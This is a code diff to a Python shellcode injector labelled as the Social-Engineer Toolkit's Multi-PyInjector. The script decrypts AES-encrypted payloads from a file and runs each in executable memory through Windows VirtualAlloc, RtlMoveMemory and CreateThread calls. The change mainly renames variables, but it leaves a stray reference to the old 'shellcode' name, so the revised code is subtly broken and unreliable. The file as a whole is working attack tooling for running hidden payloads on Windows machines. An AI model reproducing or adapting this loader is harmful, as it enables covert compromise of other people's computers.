@@ -1,6 +1,6 @@
 #
 # The Social-Engineer Toolkit Multi-PyInjector revised and simplified version.
-# Version: 0.2
+# Version: 0.3
 # 
 # This will spawn only a seperate thread per each shellcode instance.
 #
@@ -18,19 +18,19 @@ from Crypto.Cipher import AES
 import multiprocessing
 
 # define our shellcode injection code through ctypes
-def inject(shellcode):
-    shellcode = shellcode.decode("string_escape")
-    shellcode = bytearray(shellcode)
+def injection(sc):
+    sc = sc.decode("string_escape")
+    sc = bytearray(sc)
     ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
-                                              ctypes.c_int(len(shellcode)),
+                                              ctypes.c_int(len(sc)),
                                               ctypes.c_int(0x3000),
                                               ctypes.c_int(0x40))
     ctypes.windll.kernel32.VirtualLock(ctypes.c_int(ptr),
-                                       ctypes.c_int(len(shellcode)))
-    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
+                                       ctypes.c_int(len(sc)))
+    buf = (ctypes.c_char * len(shellcode)).from_buffer(sc)
     ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                          buf,
-                                         ctypes.c_int(len(shellcode)))
+                                         ctypes.c_int(len(sc)))
     ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                              ctypes.c_int(0),
                                              ctypes.c_int(ptr),
@@ -50,7 +50,7 @@ if __name__ == '__main__':
             payload_filename = sys.argv[1]
             if os.path.isfile(payload_filename):
                 fileopen = file(payload_filename, "r")
-                shellcode = fileopen.read()
+                sc = fileopen.read()
             # if we didn't file our shellcode path then exit out
             if not os.path.isfile(payload_filename):
                 sys.exit()
@@ -70,17 +70,17 @@ if __name__ == '__main__':
             DecryptAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
             cipher = AES.new(secret)
             # our decrypted value for shellcode
-            shellcode = DecryptAES(cipher, shellcode)
+            sc = DecryptAES(cipher, sc)
             # split our shellcode into a list
-            shellcode = shellcode.split(",")
+            sc = sc.split(",")
         
     # except an indexerror and allow it to continue forward
     except IndexError:
         sys.exit()
     
     jobs = []
-    for payload in shellcode:
+    for payload in sc:
         if payload != "":
-            p = multiprocessing.Process(target=inject, args=(payload,))
+            p = multiprocessing.Process(target=injection, args=(payload,))
             jobs.append(p)
             p.start()
